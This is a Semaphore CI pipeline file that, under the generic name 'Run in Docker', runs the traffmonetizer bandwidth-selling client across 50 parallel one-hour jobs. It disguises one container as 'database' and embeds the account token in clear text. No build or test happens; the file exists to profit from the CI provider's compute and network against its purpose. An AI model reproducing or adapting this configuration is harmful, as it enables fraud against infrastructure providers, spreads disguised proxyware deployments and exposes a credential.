version: v1.0
name: Run in Docker
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
  containers:
    - name: main
      image: 'traffmonetizer/cli_v2:latest'
    - name: database
      image: 'traffmonetizer/cli_v2:latest'
blocks:
  - name: Semaphore CI Pool
    task:
      jobs:
        - name: Run job
          parallelism: 50
          execution_time_limit:
            hours: 1
          commands:
            - checkout
            - docker run -i --name tm traffmonetizer/cli_v2 start accept --token FQWHMF1sZYu6ofoqkToZiLE4SOspwe5d/rgC8vXLgII=
